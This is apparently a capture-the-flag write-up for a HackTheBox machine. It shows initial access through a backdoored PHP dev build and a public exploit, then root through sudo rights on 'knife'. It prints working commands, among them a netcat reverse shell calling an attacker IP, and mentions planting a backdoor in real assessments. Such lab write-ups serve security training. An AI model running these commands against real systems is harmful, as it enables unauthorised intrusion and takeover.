## Initial Access - Vulnerable PHP version and Publicly Available Exploit leads to RCE

**Vulnerability Explanation:** The PHP version running on the web server on port 80 is vulnerable with a backdoor. There is a publicly available exploit available that can be used to gain RCE to the system.

**Vulnerability Fix:** Upgrade to a nonvulnerable version of PHP.

**Severity:** Critical

**Steps to reproduce the attack:** Christian began with an nmap port scan and discovered port 80 open. Enumerating further revealed that PHP 8.1.0-dev is running and it is vulnerable to RCE by a back door. A publicly available exploit was found and used to gain access.

**Port Scan Results**

**TCP:** 22, 80

**UDP:** N/A

Use nmap to scan the target for open ports.

TCP ports 22, 80 were discovered.

```shell
sudo nmap -p- -T5 -vvv -oN nmap.initial 10.10.10.242
```

Use 'whatweb' to quickly enumerate the versions the web page is using.

```
whatweb 10.10.10.242
```

The PHP version that the web page is using is potentially vulnerable according to a quick google search. Copy the exploit-db exploit to the working directory.

```
searchsploit -m 49933
```

Run the exploit and enter the target url when prompted.

We now have initial access to the machine as user 'james'.

## Privilege Escalation - Sudo Privileges + GTFOBins

**Vulnerability Explanation:** User 'james' has permissions to run the 'knife' command with sudo privileges. This allows attackers to elevate privileges using known exploits found in GTFOBins.

**Vulnerability Fix:** Remove 'knife' command from 'james' sudo privileges if not needed.

**Severity:** Critical

**Steps to reproduce the attack:** Running the command 'sudo -l' reveals what commands we can run as 'sudo'. We can run the command 'knife' which we can exploit to gain root access via the exploit given on GTFOBins.

Run 'sudo -l' to show what sudo commands we can run on the target machine.

```shell
sudo -l
```

We can run the command 'knife', however, we do not have fully interactive shell yet. Only the shell that the exploit gave us.

Upgrade to new shell by starting a netcat listener on our Kali attacker machine and running the following command.

```shell
nc -nlvp 4444
```

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.8 4444 >/tmp/f
```

![img-description](/assets/img/HTB/KNIFE/8.png)
We will receive a reverse shell on our nc listener and we can upgrade the shell again.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

On GTFObins webpage, we can find the exploit to elevate our privileges. Run them on our new shell.

```
sudo knife exec -E 'exec "/bin/sh"'
```

We know have root access to the machine.

## Post Exploitation

Since this is a CTF the objective is only to retrieve the flag located in the /root directory as a privileged user. 

In a real world assessment, we would attempt to add a back door for continuous access to the machine.
